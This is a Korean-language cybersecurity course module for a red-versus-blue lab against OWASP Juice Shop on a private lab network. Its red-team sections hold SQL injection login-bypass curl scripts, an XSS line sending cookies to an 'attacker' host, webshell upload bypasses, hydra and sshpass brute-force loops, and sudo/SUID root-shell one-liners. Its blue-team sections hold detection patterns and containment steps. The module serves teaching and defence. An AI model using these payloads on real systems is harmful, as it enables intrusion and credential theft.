# Week 12: 1v1 공방전 실전 (2) -- 공격자 침투 vs 방어자 차단/대응

## 학습 목표
- Red Team으로서 Week 11 정찰 결과를 활용하여 실제 침투(Initial Access)를 수행할 수 있다
- 웹 취약점(SQLi, XSS, 파일 업로드)을 활용한 초기 접근 기법을 실습한다
- SSH 브루트포스와 사전 공격(Dictionary Attack)의 원리와 방어법을 이해한다
- Blue Team으로서 침투 시도를 실시간으로 탐지하고 즉각적인 차단/봉쇄를 수행할 수 있다
- 침투 성공 시 Blue Team의 긴급 대응 절차(격리→증거수집→근절→복구)를 실행할 수 있다
- 권한 상승(Privilege Escalation)과 지속성(Persistence) 기법을 이해하고 탐지할 수 있다
- Red/Blue 양측의 침투-대응 타임라인을 대조 분석하여 교훈을 도출할 수 있다

## 전제 조건
- Week 11의 1v1 공방전 경험 및 정찰 결과 보유
- Week 03~04 웹 취약점 기초 (SQLi, XSS) 복습
- Week 09 인시던트 대응 프레임워크 숙지
- Week 10 하드닝 체크리스트 실행 경험

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:35 | 침투 기법 이론 + 방어 대응 전략 | 강의 |
| 0:35-1:05 | 권한 상승 + 지속성 기법과 탐지 | 강의 |
| 1:05-1:15 | 휴식 + 환경 준비 | - |
| 1:15-1:55 | 1v1 공방전 Round 3 (침투 vs 차단) | 실습 |
| 1:55-2:35 | 1v1 공방전 Round 4 (역할 교대) | 실습 |
| 2:35-2:45 | 휴식 | - |
| 2:45-3:10 | 결과 분석 + 침투-대응 타임라인 | 실습 |
| 3:10-3:40 | 디브리핑 + 퀴즈 + 과제 안내 | 토론/퀴즈 |

---

# Part 1: 침투 기법 이론 (35분)

## 1.1 침투(Initial Access)의 위치

Week 11에서 수행한 정찰은 공격의 "눈"이었다. 이번 주는 정찰 결과를 바탕으로 실제 시스템에 접근하는 "손"에 해당한다.

**MITRE ATT&CK 매핑:**
```
이번 주에서 다루는 전술:
  +-- [Red]  TA0001 Initial Access  — 초기 접근
  |   +-- T1190 Exploit Public-Facing App (웹 취약점)
  |   +-- T1110 Brute Force (SSH 사전 공격)
  |   +-- T1078 Valid Accounts (약한 자격증명)
  |
  +-- [Red]  TA0002 Execution — 코드 실행
  |   +-- T1059.004 Unix Shell
  |   +-- T1059.007 JavaScript
  |
  +-- [Red]  TA0004 Privilege Escalation — 권한 상승
  |   +-- T1548.001 Setuid and Setgid
  |   +-- T1068 Exploitation for Privilege Escalation
  |
  +-- [Red]  TA0003 Persistence — 지속성
  |   +-- T1136.001 Local Account
  |   +-- T1053.003 Cron
  |
  +-- [Blue] Detection — 탐지
  +-- [Blue] Containment — 봉쇄/격리
```

### 침투 벡터 분류

| 벡터 | 성공률 | 시간 | 탐지 용이성 | 공방전 적합성 |
|------|--------|------|-----------|-------------|
| **웹 취약점 (SQLi)** | 높음 | 5~15분 | 중간 | 최적 |
| **웹 취약점 (XSS→세션 탈취)** | 중간 | 10~20분 | 낮음 | 좋음 |
| **파일 업로드 (웹셸)** | 높음 | 5~10분 | 높음 | 좋음 |
| **SSH 브루트포스** | 낮음 | 10~30분 | 매우 높음 | 비효율 |
| **알려진 CVE 공격** | 상황에 따라 | 5~20분 | 중간 | 상황에 따라 |

## 1.2 웹 취약점 공격 기법

### SQL Injection (SQLi) 공격 흐름

```
[SQLi 공격 프로세스]

1. 입력 지점 식별
   로그인 폼, 검색 기능, URL 파라미터
       |
2. 인젝션 테스트
   ' OR 1=1-- , " OR ""=", ' UNION SELECT--
       |
3. DB 정보 수집
   UNION SELECT table_name FROM information_schema.tables
       |
4. 데이터 추출
   UNION SELECT username,password FROM users
       |
5. 인증 우회 또는 데이터 탈취
```

### XSS(Cross-Site Scripting) 공격 흐름

```
[Stored XSS → 세션 탈취]

1. 저장형 XSS 삽입 지점 발견
   게시판, 댓글, 프로필 등
       |
2. 악성 스크립트 삽입
   <script>document.location='http://attacker/steal?c='+document.cookie</script>
       |
3. 관리자/다른 사용자가 페이지 방문
       |
4. 쿠키/세션 토큰 탈취
       |
5. 세션 하이재킹으로 로그인 우회
```

### 파일 업로드 공격 (웹셸)

```
[웹셸 업로드 흐름]

1. 파일 업로드 기능 발견
   프로필 이미지, 첨부파일 등
       |
2. 업로드 필터 우회 시도
   +-- 확장자 변경: .php → .php5, .phtml, .phar
   +-- MIME 타입 위조: Content-Type: image/jpeg
   +-- 이중 확장자: shell.php.jpg
   +-- 널 바이트: shell.php%00.jpg
       |
3. 웹셸 업로드 성공
       |
4. 업로드된 파일 경로 확인
   /uploads/shell.php
       |
5. 웹셸을 통한 명령 실행
   http://target/uploads/shell.php?cmd=whoami
```

## 1.3 SSH 브루트포스와 사전 공격

### 공격 방법 비교

| 방법 | 원리 | 속도 | 성공률 | 탐지 |
|------|------|------|--------|------|
| **브루트포스** | 모든 조합 시도 | 매우 느림 | 이론적 100% | 즉시 탐지 |
| **사전 공격** | 일반적 비밀번호 목록 | 빠름 | 낮~중간 | 탐지 가능 |
| **자격증명 스터핑** | 유출된 계정 정보 | 빠름 | 중간 | 탐지 가능 |
| **패스워드 스프레이** | 소수 비밀번호 x 다수 계정 | 느림 | 낮~중간 | 탐지 어려움 |

## 1.4 권한 상승 기법

### Linux 권한 상승 체크리스트

```
[권한 상승 탐색 순서]

1. SUID/SGID 바이너리
   find / -perm -4000 2>/dev/null
   → GTFOBins에서 악용 가능한 바이너리 확인

2. sudo 설정
   sudo -l
   → NOPASSWD 항목, 특정 명령 허용 여부

3. 커널 취약점
   uname -r && searchsploit linux kernel
   → 커널 버전 기반 CVE 검색

4. 잘못된 파일 권한
   ls -la /etc/shadow (읽기 가능?)
   ls -la /etc/passwd (쓰기 가능?)

5. 크론 작업
   cat /etc/crontab
   → root로 실행되는 스크립트에 쓰기 가능?

6. 환경 변수
   echo $PATH
   → PATH 하이재킹 가능?
```

## 1.5 Blue Team 대응 전략

### 침투 단계별 대응

| 공격 단계 | 탐지 방법 | 대응 조치 | 우선순위 |
|---------|---------|---------|---------|
| 웹 공격 시도 | access.log 패턴 분석 | WAF 룰 추가, IP 차단 | 높음 |
| SSH 브루트포스 | auth.log 실패 횟수 | fail2ban, IP 차단 | 높음 |
| 웹셸 업로드 | 파일 시스템 모니터링 | 업로드 디렉토리 실행 차단 | 긴급 |
| 리버스 셸 | IDS 알림, 외부 연결 감시 | 네트워크 격리 | 긴급 |
| 권한 상승 | 프로세스 모니터링, auditd | 프로세스 종료, 취약점 패치 | 긴급 |
| 지속성 설정 | crontab/사용자/키 감시 | 즉시 제거, 근절 | 높음 |

---

# Part 2: 권한 상승 + 지속성 기법과 탐지 (30분)

## 2.1 권한 상승 상세

### SUID 악용 예시

```
[SUID find 명령을 이용한 권한 상승]

조건: find에 SUID가 설정되어 있거나, sudo로 실행 가능

$ sudo find / -exec /bin/sh \; -quit
# → root 셸 획득

$ find . -exec /bin/bash -p \; -quit
# → (SUID 설정 시) euid=root 셸

[SUID vim 악용]
$ sudo vim -c ':!/bin/sh'
# → vim에서 셸 탈출 → root 셸

[GTFOBins 참조]
https://gtfobins.github.io/
→ SUID/sudo 악용 가능한 바이너리 목록
```

### sudo 설정 악용

```
[위험한 sudo 설정 예시]

# 특정 명령 NOPASSWD
web ALL=(ALL) NOPASSWD: /usr/bin/vim
→ sudo vim → :!/bin/sh → root

# 환경 변수 유지
Defaults env_keep += "LD_PRELOAD"
→ 악성 공유 라이브러리 로드 가능

# 와일드카드
web ALL=(ALL) NOPASSWD: /usr/bin/find *
→ find -exec로 임의 명령 실행
```

## 2.2 지속성(Persistence) 기법

### 일반적인 지속성 기법

| 기법 | 방법 | 탐지 | 제거 |
|------|------|------|------|
| **백도어 계정** | `useradd backdoor` | `/etc/passwd` 모니터링 | `userdel -r` |
| **SSH 키 추가** | `echo key >> authorized_keys` | 키 파일 모니터링 | 키 제거 |
| **Cron 작업** | `crontab -e` (리버스 셸) | `/etc/crontab` 감시 | 항목 제거 |
| **Systemd 서비스** | 악성 서비스 유닛 | `systemctl list-unit-files` | 서비스 삭제 |
| **.bashrc 수정** | 로그인 시 악성코드 실행 | 파일 무결성 검사 | 원복 |
| **SUID 백도어** | `cp /bin/bash /tmp/.sh; chmod u+s` | SUID 감사 | 파일 삭제 |

## 2.3 Blue Team 탐지 기법

### 실시간 파일 시스템 모니터링

```
[inotifywait를 이용한 파일 변경 감시]

감시 대상:
+-- /etc/passwd, /etc/shadow     — 계정 변경
+-- /etc/crontab, /etc/cron.d/   — 크론 변경
+-- ~/.ssh/authorized_keys        — SSH 키 추가
+-- /tmp, /var/tmp, /dev/shm     — 악성 파일 생성
+-- /etc/systemd/system/          — 서비스 추가

명령:
inotifywait -m -r -e create,modify,delete \
  /etc/passwd /etc/crontab /tmp/
```

---

# Part 3: 1v1 공방전 실습 Round 3 (40분)

## 실습 3.1: Red Team 침투 실행

### Step 1: 웹 취약점 공격 (JuiceShop)

> **실습 목적**: Week 11에서 식별한 JuiceShop(3000)의 웹 취약점을 활용하여 초기 접근을 시도한다.
>
> **배우는 것**: SQL Injection 실습, 인증 우회, 웹 애플리케이션 공격 실전

```bash
# === Red Team: 웹 취약점 공격 ===
echo "[$(date +%H:%M:%S)] 웹 취약점 공격 시작"

# JuiceShop 로그인 페이지 확인
curl -s http://10.20.30.80:3000/ | grep -o '<title>[^<]*</title>'
# 예상 출력: <title>OWASP Juice Shop</title>

# SQL Injection으로 인증 우회 시도
echo "[SQLi 시도] 로그인 우회"
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"anything"}' 2>/dev/null | \
  python3 -c "import sys,json; d=json.load(sys.stdin); print(f'결과: {\"성공\" if \"authentication\" in d else \"실패\"}')" 2>/dev/null || echo "응답 파싱 실패"
# 예상 출력: 결과: 성공 (또는 응답에 토큰 포함)

# 관리자 계정으로 SQLi 시도
echo "[SQLi 시도] 관리자 계정"
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'\''--","password":"anything"}' 2>/dev/null | head -c 200
echo ""

# 사용자 목록 조회 시도 (API 탐색)
echo "[API 탐색] 사용자 정보"
curl -s http://10.20.30.80:3000/api/Users 2>/dev/null | \
  python3 -c "import sys,json; d=json.load(sys.stdin); print(f'사용자 수: {len(d.get(\"data\",[]))}')" 2>/dev/null || echo "API 접근 실패"

echo "[$(date +%H:%M:%S)] 웹 공격 Phase 완료"
```

> **결과 해석**:
> - SQLi `' OR 1=1--`: 모든 사용자 조건을 참으로 만들어 첫 번째 사용자로 로그인
> - `admin@juice-sh.op'--`: 관리자 이메일 뒤의 조건을 주석 처리하여 비밀번호 무시
> - `/api/Users`: API 엔드포인트가 인증 없이 접근 가능한지 확인
>
> **실전 활용**: 웹 취약점은 공방전에서 가장 빈번하게 사용되는 초기 접근 벡터이다. SQLi 성공 시 데이터 탈취와 인증 우회가 가능하다.
>
> **명령어 해설**:
> - `curl -X POST ... -d '{"email":"..."}`: JSON 형태의 POST 요청
> - `' OR 1=1--`: SQL 주석(`--`)으로 나머지 쿼리를 무효화
>
> **트러블슈팅**:
> - JSON 파싱 오류: 응답이 HTML인 경우 → Content-Type 확인
> - 연결 거부: Blue Team이 이미 차단했을 수 있음 → 다른 벡터 시도

### Step 2: SSH 브루트포스 시도

> **실습 목적**: SSH 비밀번호 인증을 대상으로 사전 공격을 시도한다. 브루트포스의 현실적인 제약을 이해한다.
>
> **배우는 것**: hydra를 이용한 SSH 사전 공격, 패스워드 스프레이, 공격 시간 추정

```bash
# === Red Team: SSH 사전 공격 ===
echo "[$(date +%H:%M:%S)] SSH 사전 공격 시작"

# 일반적인 비밀번호 목록 생성
cat << 'EOF' > /tmp/passwords.txt
password
123456
admin
root
web
1234
password1
admin123
test
1
EOF
echo "사전 파일: $(wc -l < /tmp/passwords.txt)개 비밀번호"

# 사용자 이름 목록
cat << 'EOF' > /tmp/users.txt
root
web
admin
user
test
EOF
echo "사용자 파일: $(wc -l < /tmp/users.txt)개 사용자"

# hydra가 설치되어 있으면 사전 공격 시도
which hydra > /dev/null 2>&1 && {
  echo "[hydra 사전 공격] web 서버 SSH"
  hydra -L /tmp/users.txt -P /tmp/passwords.txt \
    -t 4 -f -V ssh://10.20.30.80 2>/dev/null | tail -5
  # -t 4: 동시 스레드 4개
  # -f: 성공하면 즉시 중단
  # -V: 각 시도 출력
} || {
  echo "[수동 SSH 시도] hydra 미설치 — 수동 시도"
  # 수동으로 몇 가지 시도
  for user in web root; do
    for pass in 1 password 123456; do
      sshpass -p"$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
        "$user@10.20.30.80" "echo 'SUCCESS: $user/$pass'" 2>/dev/null && break 2
    done
  done
  echo "수동 시도 완료"
}

echo "[$(date +%H:%M:%S)] SSH 공격 완료"
```

> **결과 해석**:
> - hydra는 여러 사용자/비밀번호 조합을 자동으로 시도한다
> - `-t 4`: 너무 많은 스레드는 Blue Team의 IDS에 즉시 탐지되고 차단당한다
> - 실습 환경에서 비밀번호가 "1"이므로 성공 가능하지만, 실전에서는 복잡한 비밀번호에는 비효율적
>
> **실전 활용**: SSH 브루트포스는 탐지되기 쉽고 시간이 오래 걸려 공방전에서는 비효율적이다. 약한 비밀번호가 확실한 경우에만 시도한다.
>
> **명령어 해설**:
> - `hydra -L <users> -P <passwords>`: 사용자/비밀번호 파일 지정
> - `-t 4`: 동시 4개 연결 (너무 높이면 탐지/차단됨)
> - `-f`: 첫 번째 성공 시 즉시 종료
>
> **트러블슈팅**:
> - "connection refused": MaxAuthTries 초과 또는 Blue Team 차단
> - "too many authentication failures": SSH 설정에서 MaxAuthTries 도달

### Step 3: 침투 후 행동 (Post-Exploitation)

> **실습 목적**: 초기 접근 성공 후 권한 상승과 지속성 확보를 시도한다.
>
> **배우는 것**: 초기 셸에서의 정보 수집, 권한 상승 탐색, 지속성 설정

```bash
# === Red Team: 침투 후 행동 (셸 획득 가정) ===
echo "[$(date +%H:%M:%S)] Post-Exploitation 시작"

# SSH 접근 성공 시나리오 (비밀번호 '1'로 접근)
echo "[정보 수집]"
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'POSTEX'
echo "=== 시스템 정보 ==="
echo "호스트: $(hostname)"
echo "사용자: $(whoami)"
echo "커널: $(uname -r)"
echo "배포판: $(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2)"

echo ""
echo "=== 권한 상승 탐색 ==="
echo "[sudo -l]"
sudo -l 2>/dev/null || echo "sudo 정보 없음"

echo ""
echo "[SUID 파일]"
find / -perm -4000 -type f 2>/dev/null | head -10

echo ""
echo "[/etc/passwd 쓰기 가능?]"
ls -la /etc/passwd
[ -w /etc/passwd ] && echo "쓰기 가능! (권한 상승 가능)" || echo "쓰기 불가 (정상)"

echo ""
echo "[크론 작업]"
cat /etc/crontab 2>/dev/null | grep -v "^#" | head -10

echo ""
echo "=== 네트워크 정보 ==="
echo "[내부 연결]"
ss -tn 2>/dev/null | head -10
POSTEX

echo "[$(date +%H:%M:%S)] Post-Exploitation 정보 수집 완료"
```

> **결과 해석**:
> - `whoami`: 현재 사용자 확인 (root가 아니면 권한 상승 필요)
> - `sudo -l`: sudo로 실행 가능한 명령 확인 (NOPASSWD 항목이 핵심)
> - `/etc/passwd` 쓰기 가능: root 권한 없이도 계정 추가 가능 (심각)
> - SUID 파일: GTFOBins에서 악용 가능한 바이너리 검색
>
> **실전 활용**: 침투 후 가장 먼저 수행하는 것이 "상황 파악"이다. 시스템 정보, 권한, 네트워크를 빠르게 수집하여 다음 행동을 결정한다.
>
> **명령어 해설**:
> - `sudo -l`: 현재 사용자가 sudo로 실행 가능한 명령 목록
> - `find / -perm -4000`: SUID 비트 설정된 파일 검색
> - `[ -w /etc/passwd ]`: 파일 쓰기 권한 테스트
>
> **트러블슈팅**:
> - sudo: "sorry, user web may not run sudo": 권한 없음 → 다른 상승 경로 탐색
> - SSH 접속 실패: Blue Team이 비밀번호를 변경했을 수 있음

## 실습 3.2: Blue Team 침투 탐지 및 대응

### Step 1: 침투 시도 실시간 탐지

> **실습 목적**: Red Team의 침투 시도를 다양한 로그 소스에서 실시간으로 탐지한다.
>
> **배우는 것**: 웹 공격 탐지(access.log), SSH 공격 탐지(auth.log), 종합 분석

```bash
# === Blue Team: 침투 탐지 ===
echo "[$(date +%H:%M:%S)] 침투 탐지 분석 시작"

# SSH 브루트포스 탐지
echo "[SSH 인증 분석]"
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "grep -c 'Failed password' /var/log/auth.log 2>/dev/null"
echo "건의 실패한 SSH 인증 시도"

sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "grep 'Failed password' /var/log/auth.log 2>/dev/null | \
   awk '{print \$(NF-3)}' | sort | uniq -c | sort -rn | head -5"
# 예상 출력: 소스 IP별 실패 횟수

# 성공한 SSH 로그인 확인
echo ""
echo "[성공한 SSH 로그인]"
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "grep 'Accepted' /var/log/auth.log 2>/dev/null | tail -10"
# 예상 출력: Accepted password for web from 10.20.30.201 port ...

# 웹 공격 탐지 (access.log)
echo ""
echo "[웹 공격 패턴]"
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "grep -iE \"(union|select|insert|drop|script|alert|onerror|eval|exec|cmd)\" \
   /var/log/apache2/access.log 2>/dev/null | tail -10"
# 예상 출력: SQLi, XSS 시도가 포함된 HTTP 요청

# Suricata IDS 알림
echo ""
echo "[IDS 침투 관련 알림]"
sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
  "grep -iE 'sql|injection|xss|exploit|shell|trojan|reverse' \
   /var/log/suricata/fast.log 2>/dev/null | tail -10"

echo "[$(date +%H:%M:%S)] 탐지 분석 완료"
```

> **결과 해석**:
> - SSH 실패 10회 이상: 브루트포스 공격 확정 → IP 차단 필요
> - `Accepted` 로그: 공격자가 성공적으로 로그인한 증거 → 긴급 대응
> - SQL/XSS 키워드: 웹 공격 시도 → WAF 규칙 추가 또는 IP 차단
>
> **실전 활용**: "Accepted" 로그를 발견하면 즉시 IR 프로세스를 시작해야 한다. 공격자가 이미 시스템에 접근한 상태이므로 격리가 최우선이다.
>
> **명령어 해설**:
> - `grep -iE "(union|select|...)"`: 대소문자 무시하고 SQL/XSS 키워드 검색
> - `awk '{print $(NF-3)}'`: auth.log에서 소스 IP 추출 (끝에서 4번째 필드)
>
> **트러블슈팅**:
> - access.log가 없는 경우: Apache가 중단되었거나 로그 경로가 다름
> - 로그가 너무 많은 경우: 시간 범위로 필터링 → `awk '/Apr  3 14:/' {print}`

### Step 2: 긴급 차단 및 격리

> **실습 목적**: 침투가 확인된 경우 즉각적인 차단과 격리를 수행한다.
>
> **배우는 것**: 긴급 IP 차단, 세션 종료, 네트워크 격리, 서비스 가용성 유지

```bash
# === Blue Team: 긴급 대응 ===
echo "[$(date +%H:%M:%S)] 긴급 대응 시작"

ATTACKER_IP="10.20.30.201"

# 1. 공격자 IP 차단 (secu 방화벽)
echo "[조치 1] 공격자 IP 차단"
# sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
#   "echo 1 | sudo -S nft add rule inet filter input ip saddr $ATTACKER_IP drop"
echo "(시뮬레이션) nft add rule inet filter input ip saddr $ATTACKER_IP drop"

# 2. 공격자 세션 종료 (web 서버)
echo ""
echo "[조치 2] 공격자 세션 확인/종료"
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "who 2>/dev/null"
# 공격자 세션이 있으면:
# sshpass -p1 ssh web@10.20.30.80 "echo 1 | sudo -S pkill -u web"

# 3. 비밀번호 즉시 변경
echo ""
echo "[조치 3] 비밀번호 변경"
# sshpass -p1 ssh web@10.20.30.80 \
#   "echo 'web:NEW_STRONG_PASS' | sudo chpasswd"
echo "(시뮬레이션) 비밀번호 변경"

# 4. 증거 수집 (격리 전)
echo ""
echo "[조치 4] 빠른 증거 수집"
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "ps auxf | grep -v '^\[' | head -20" > /tmp/blue_evidence_ps.txt
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "ss -tnpa" > /tmp/blue_evidence_net.txt
echo "증거 수집 완료: ps, network"

# 5. 서비스 가용성 확인
echo ""
echo "[확인] 서비스 가용성"
curl -s -o /dev/null -w "Apache: %{http_code}  " --connect-timeout 3 http://10.20.30.80:80/
curl -s -o /dev/null -w "Juice: %{http_code}\n" --connect-timeout 3 http://10.20.30.80:3000/

echo "[$(date +%H:%M:%S)] 긴급 대응 완료"
```

> **결과 해석**:
> - IP 차단: 공격자의 추가 접근을 즉시 막는다
> - 세션 종료: 이미 접속한 공격자를 강제 로그아웃시킨다
> - 비밀번호 변경: 탈취된 자격증명을 무효화한다
> - 서비스 가용성: 방어 조치 중에도 서비스가 중단되지 않아야 한다
>
> **실전 활용**: 이 순서는 Week 09 NIST IR의 "봉쇄" 단계에 해당한다. 차단→세션종료→자격증명변경→증거수집 순서를 준수한다.
>
> **명령어 해설**:
> - `pkill -u <user>`: 해당 사용자의 모든 프로세스 종료 (세션 포함)
> - `chpasswd`: 비밀번호 일괄 변경 (echo 'user:password' | chpasswd)
>
> **트러블슈팅**:
> - pkill 후 서비스 중단: 해당 사용자로 실행되는 서비스도 종료됨 → 서비스 재시작 필요
> - 비밀번호 변경 실패: PAM 정책에 의해 거부될 수 있음 → root로 직접 변경

### Step 3: 근절 및 복구

> **실습 목적**: 공격자가 남긴 흔적을 제거하고 시스템을 정상 상태로 복구한다.
>
> **배우는 것**: 백도어 탐지/제거, 설정 복원, 하드닝 강화

```bash
# === Blue Team: 근절 + 복구 ===
echo "[$(date +%H:%M:%S)] 근절 시작"

# 백도어 계정 확인
echo "[근절 1] 비정상 계정 확인"
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "grep -E '/bin/(ba)?sh' /etc/passwd | grep -v 'root\|web\|sshd'"
# 비정상 계정이 있으면 userdel -r로 제거

# 의심 파일 확인
echo ""
echo "[근절 2] 의심 파일 확인"
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "find /tmp /var/tmp /dev/shm -name '.*' -type f 2>/dev/null; \
   find /tmp /var/tmp -perm -111 -type f 2>/dev/null"

# crontab 확인
echo ""
echo "[근절 3] 크론 작업 확인"
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "echo 1 | sudo -S crontab -l 2>/dev/null; \
   echo 1 | sudo -S cat /var/spool/cron/crontabs/* 2>/dev/null"

# SSH authorized_keys 확인
echo ""
echo "[근절 4] SSH 키 확인"
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "cat ~/.ssh/authorized_keys 2>/dev/null; \
   echo 1 | sudo -S cat /root/.ssh/authorized_keys 2>/dev/null"

# 하드닝 강화 (침투 경로 차단)
echo ""
echo "[복구] 하드닝 강화 — 침투 경로 차단"
echo "  - SSH MaxAuthTries 3으로 변경"
echo "  - 웹 업로드 디렉토리 실행 권한 제거"
echo "  - 모니터링 룰 추가"

echo "[$(date +%H:%M:%S)] 근절 + 복구 완료"
```

> **결과 해석**:
> - 비정상 계정: root, web 외의 셸 접근 가능 계정은 백도어 의심
> - /tmp의 실행 파일: 악성코드가 자주 사용하는 경로
> - authorized_keys: 공격자의 SSH 키가 추가되었는지 확인
>
> **실전 활용**: 근절 후에는 반드시 하드닝을 강화하여 같은 경로로 재침투당하지 않도록 해야 한다.
>
> **명령어 해설**:
> - `find /tmp -perm -111`: 실행 권한이 있는 파일 검색
> - `cat /var/spool/cron/crontabs/*`: 모든 사용자의 crontab 확인
>
> **트러블슈팅**:
> - 근절 후 서비스 이상: 공격자가 설정을 변경했을 수 있음 → 백업에서 복원 (Week 10)

---

# Part 4: 결과 분석 + 디브리핑 (25분)

## 실습 4.1: 침투-대응 타임라인 비교

### Step 1: 종합 분석

> **실습 목적**: 침투와 대응의 전 과정을 시간순으로 대조하여 방어 갭을 식별한다.
>
> **배우는 것**: 공방 타임라인 작성, MITRE ATT&CK 매핑, 개선점 도출

```bash
cat << 'TIMELINE'
=== 공방전 Round 3/4 침투-대응 타임라인 ===

시간    Red Team                    Blue Team                결과
------------------------------------------------------------------
0:00    SQLi 시도 (JuiceShop)      모니터링 시작            -
0:02    인증 우회 성공              (access.log 미확인)      미탐지
0:05    API 탐색 (사용자 정보)      access.log: 200 정상     미탐지
0:08    SSH 브루트포스 시작          auth.log: Failed 연속    탐지!
0:10    SSH 접속 성공 (web/1)       auth.log: Accepted       탐지!
0:11    시스템 정보 수집             (정상 명령처럼 보임)      미탐지
0:13    SUID 탐색                   (ps에서 find 확인)       미탐지
0:15    -                           IP 차단 결정/실행        대응
0:16    SSH 연결 끊김               차단 확인                차단 성공
0:18    -                           비밀번호 변경            대응
0:20    -                           백도어 확인 + 근절       대응
0:25    재접근 시도 실패             차단 유지 확인           방어 성공

ATT&CK 매핑:
  T1190 (SQLi)    → 탐지 실패 (웹 로그 분석 미흡)
  T1110 (SSH BF)  → 탐지 성공 (auth.log 모니터링)
  T1078 (약한 PW) → 탐지 성공 (Accepted 로그)
  T1059 (Shell)   → 탐지 실패 (정상 명령과 구분 어려움)

총평:
  침투 성공: 예 (SSH 접근)
  탐지 시간: 2분 (브루트포스 시작 후)
  차단 시간: 7분 (침투 성공 후 5분)
  근절 시간: 10분 (추가 5분)
  개선 필요: 웹 공격 탐지, 자동 차단, 강한 비밀번호
TIMELINE
```

> **실전 활용**: 이 분석을 통해 양측 모두 개선점을 확인한다. Red Team은 탐지 회피를, Blue Team은 탐지 속도와 자동화를 개선해야 한다.

### Step 2: OpsClaw 결과 기록

> **실습 목적**: 공방전 결과를 OpsClaw에 증적으로 기록한다.
>
> **배우는 것**: OpsClaw completion-report API 활용

```bash
RESULT=$(curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{"name":"week12-battle-r2","request_text":"1v1 공방전 Phase 2 침투","master_mode":"external"}')
PID=$(echo $RESULT | python3 -c "import sys,json; print(json.load(sys.stdin)['project']['id'])")
curl -s -X POST "http://localhost:8000/projects/$PID/plan" -H "X-API-Key: opsclaw-api-key-2026" > /dev/null
curl -s -X POST "http://localhost:8000/projects/$PID/execute" -H "X-API-Key: opsclaw-api-key-2026" > /dev/null

curl -s -X POST "http://localhost:8000/projects/$PID/completion-report" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{
    "summary": "1v1 공방전 Phase 2 완료 — 침투 vs 차단/대응",
    "outcome": "success",
    "work_details": [
      "Red: SQLi 인증우회 -> SSH 브루트포스 -> 시스템 정보 수집",
      "Blue: SSH 브루트포스 탐지 -> IP 차단 -> 비밀번호 변경 -> 근절",
      "침투 성공 후 5분 만에 차단, 10분 만에 근절 완료",
      "교훈: 웹 공격 탐지 강화, 강한 비밀번호 정책, 자동 차단 필요"
    ]
  }' | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'보고서: {d.get(\"status\",\"ok\")}')"
```

---

## 검증 체크리스트
- [ ] SQL Injection으로 인증 우회를 시도할 수 있는가
- [ ] SSH 사전 공격(hydra 또는 수동)을 수행할 수 있는가
- [ ] 침투 후 시스템 정보 수집과 권한 상승 탐색을 수행할 수 있는가
- [ ] auth.log에서 브루트포스와 성공한 로그인을 탐지할 수 있는가
- [ ] access.log에서 웹 공격 패턴(SQLi, XSS)을 식별할 수 있는가
- [ ] 긴급 IP 차단, 세션 종료, 비밀번호 변경을 신속하게 수행할 수 있는가
- [ ] 공격자가 남긴 백도어(계정, 파일, cron, SSH 키)를 탐지할 수 있는가
- [ ] 침투-대응 타임라인을 ATT&CK에 매핑하여 분석할 수 있는가

## 자가 점검 퀴즈

1. SQL Injection `' OR 1=1--`이 인증을 우회하는 원리를 SQL 쿼리 관점에서 설명하라.

2. SSH 사전 공격(Dictionary Attack)과 브루트포스(Brute Force)의 차이를 설명하라. 어떤 것이 공방전에서 더 현실적인가?

3. 파일 업로드 공격에서 웹셸을 업로드하기 위한 필터 우회 기법 3가지를 설명하라.

4. Linux에서 SUID 바이너리를 이용한 권한 상승의 원리를 설명하라. GTFOBins란 무엇인가?

5. Blue Team이 SSH 브루트포스를 탐지한 후 수행해야 할 대응 조치를 우선순위 순으로 5가지 나열하라.

6. 공격자가 `authorized_keys`에 SSH 키를 추가하는 것이 지속성 기법인 이유를 설명하라.

7. Blue Team이 웹 공격(SQLi)을 탐지하기 어려운 이유와 개선 방안을 설명하라.

8. 침투 성공 후 Blue Team의 "차단까지 시간"이 왜 핵심 지표인지 설명하라.

9. 패스워드 스프레이(Password Spray) 공격이 일반 브루트포스보다 탐지하기 어려운 이유를 설명하라.

10. 공방전에서 Red Team이 지속성을 확보하기 위해 사용할 수 있는 기법 5가지를 나열하고, Blue Team의 대응 방법을 각각 설명하라.

## 과제

### 과제 1: 침투 보고서 (필수)
- Red Team 관점에서 수행한 침투 시도를 시간순으로 정리
- 성공/실패한 기법과 원인 분석
- ATT&CK TTP 매핑 (최소 5개)
- 또는 Blue Team 관점에서 탐지/대응 보고서 작성

### 과제 2: 웹 취약점 실습 보고서 (선택)
- JuiceShop에서 5개 이상의 취약점을 발견하고 보고서 작성
- 각 취약점에 대해: 발견 방법, 공격 과정, 영향, 대응 방안
- OWASP Top 10 매핑

### 과제 3: 자동 IR 대응 스크립트 (도전)
